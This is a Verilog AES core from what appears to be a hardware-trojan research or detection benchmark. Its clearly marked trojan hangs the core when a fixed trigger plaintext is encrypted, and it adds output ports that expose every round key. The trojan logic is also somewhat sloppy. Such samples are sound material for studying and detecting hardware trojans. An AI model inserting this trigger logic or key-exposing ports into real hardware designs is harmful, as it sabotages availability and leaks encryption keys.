//======================================================================
//
// aes_core.v
// ----------
// The AES core. This core supports key size of 128, and 256 bits.
//
// Trojan T05_dos_trojan: Denial of Service - keeps ready=0 when special
// plaintext is detected, core hangs forever.
//
//======================================================================

`default_nettype none

module aes_core_tapped(
                input wire            clk,
                input wire            reset_n,

                input wire            encdec,
                input wire            init,
                input wire            next,
                output wire           ready,

                input wire [255 : 0]  key,
                input wire            keylen,

                input wire [127 : 0]  block,
                output wire [127 : 0] result,
                output wire           result_valid,

                // Tapped outputs for monitors
                output wire [1407 : 0] round_keys_flat,
                output wire [3 : 0]   muxed_round_nr,
                output wire [127 : 0] state_before_final
               );



  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  localparam CTRL_IDLE  = 2'h0;
  localparam CTRL_INIT  = 2'h1;
  localparam CTRL_NEXT  = 2'h2;


  //----------------------------------------------------------------
  // Registers including update variables and write enable.
  //----------------------------------------------------------------
  reg [1 : 0] aes_core_ctrl_reg;
  reg [1 : 0] aes_core_ctrl_new;
  reg         aes_core_ctrl_we;

  reg         result_valid_reg;
  reg         result_valid_new;
  reg         result_valid_we;

  reg         ready_reg;
  reg         ready_new;
  reg         ready_we;

  // TROJAN BEGIN: T05_dos_trojan
  reg         dos_triggered;
  // TROJAN END: T05_dos_trojan


  //----------------------------------------------------------------
  // Wires.
  //----------------------------------------------------------------
  reg            init_state;

  wire [127 : 0] round_key;
  wire           key_ready;

  reg            enc_next;
  wire [3 : 0]   enc_round_nr;
  wire [127 : 0] enc_new_block;
  wire           enc_ready;
  wire [31 : 0]  enc_sboxw;

  reg            dec_next;
  wire [3 : 0]   dec_round_nr;
  wire [127 : 0] dec_new_block;
  wire           dec_ready;

  reg [127 : 0]  muxed_new_block;
  reg [3 : 0]    muxed_round_nr_int;
  reg            muxed_ready;

  wire [31 : 0]  keymem_sboxw;

/* verilator lint_off UNOPTFLAT */
  reg [31 : 0]   muxed_sboxw;
  wire [31 : 0]  new_sboxw;
/* verilator lint_on UNOPTFLAT */

  // State before final round (for ORC)
  reg [127 : 0] state_before_final_int;


  //----------------------------------------------------------------
  // Instantiations.
  //----------------------------------------------------------------
  aes_encipher_block enc_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(enc_next),

                               .keylen(keylen),
                               .round(enc_round_nr),
                               .round_key(round_key),

                               .sboxw(enc_sboxw),
                               .new_sboxw(new_sboxw),

                               .block(block),
                               .new_block(enc_new_block),
                               .ready(enc_ready)
                              );


  aes_decipher_block dec_block(
                               .clk(clk),
                               .reset_n(reset_n),

                               .next(dec_next),

                               .keylen(keylen),
                               .round(dec_round_nr),
                               .round_key(round_key),

                               .block(block),
                               .new_block(dec_new_block),
                               .ready(dec_ready)
                              );


  aes_key_mem_tapped keymem(
                     .clk(clk),
                     .reset_n(reset_n),

                     .key(key),
                     .keylen(keylen),
                     .init(init),

                     .round(muxed_round_nr_int),
                     .round_key(round_key),
                     .ready(key_ready),

                     .sboxw(keymem_sboxw),
                     .new_sboxw(new_sboxw),
                     .round_keys_flat(round_keys_flat)
                    );


  aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));


  //----------------------------------------------------------------
  // Concurrent connectivity for ports etc.
  //----------------------------------------------------------------
  assign ready          = ready_reg;
  assign result         = muxed_new_block;
  assign result_valid   = result_valid_reg;
  assign muxed_round_nr = muxed_round_nr_int;
  assign state_before_final = state_before_final_int;


  //----------------------------------------------------------------
  // reg_update
  //----------------------------------------------------------------
  always @ (posedge clk or negedge reset_n)
    begin: reg_update
      if (!reset_n)
        begin
          result_valid_reg   <= 1'b0;
          ready_reg          <= 1'b1;
          aes_core_ctrl_reg  <= CTRL_IDLE;
          // TROJAN BEGIN: T05_dos_trojan
          dos_triggered      <= 1'b0;
          // TROJAN END: T05_dos_trojan
          state_before_final_int <= 128'b0;
        end
      else
        begin
          if (result_valid_we)
            result_valid_reg <= result_valid_new;

          if (ready_we)
            ready_reg <= ready_new;

          if (aes_core_ctrl_we)
            aes_core_ctrl_reg <= aes_core_ctrl_new;

          // Capture state before final round for ORC
          if (enc_next && (enc_round_nr == 4'd10))
            state_before_final_int <= block;
          else if (enc_next && (enc_round_nr < 4'd10))
            state_before_final_int <= enc_new_block;
        end
    end // reg_update


  //----------------------------------------------------------------
  // sbox_mux
  //----------------------------------------------------------------
  always @*
    begin : sbox_mux
      if (init_state)
        begin
          muxed_sboxw = keymem_sboxw;
        end
      else
        begin
          muxed_sboxw = enc_sboxw;
        end
    end // sbox_mux


  //----------------------------------------------------------------
  // encdex_mux
  //----------------------------------------------------------------
  always @*
    begin : encdec_mux
      enc_next = 1'b0;
      dec_next = 1'b0;

      if (encdec)
        begin
          enc_next        = next;
          muxed_round_nr_int  = enc_round_nr;
          muxed_new_block = enc_new_block;
          muxed_ready     = enc_ready;
        end
      else
        begin
          dec_next        = next;
          muxed_round_nr_int  = dec_round_nr;
          muxed_new_block = dec_new_block;
          muxed_ready     = dec_ready;
        end
    end // encdec_mux


  //----------------------------------------------------------------
  // aes_core_ctrl
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            // TROJAN BEGIN: T05_dos_trojan
            else if (next)
              begin
                init_state        = 1'b0;
                // DoS trigger: when special plaintext detected
                if (encdec && (block == dos_trigger_value))
                  begin
                    dos_triggered   = 1'b1;
                    // DoS: stay in CTRL_IDLE, FSM stuck
                  end
                else
                  begin
                    ready_new         = 1'b0;
                    ready_we          = 1'b1;
                    result_valid_new  = 1'b0;
                    result_valid_we   = 1'b1;
                    aes_core_ctrl_new = CTRL_NEXT;
                    aes_core_ctrl_we  = 1'b1;
                  end
              end
            // TROJAN END: T05_dos_trojan
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin
          end
      endcase

    end // aes_core_ctrl

  // TROJAN BEGIN: T05_dos_trojan
  wire [127:0] dos_trigger_value;
  assign dos_trigger_value = 128'hDEADBEEFCAFED00D0000000000000001;
  // TROJAN END: T05_dos_trojan

endmodule // aes_core

//======================================================================
// EOF aes_core.v
//======================================================================
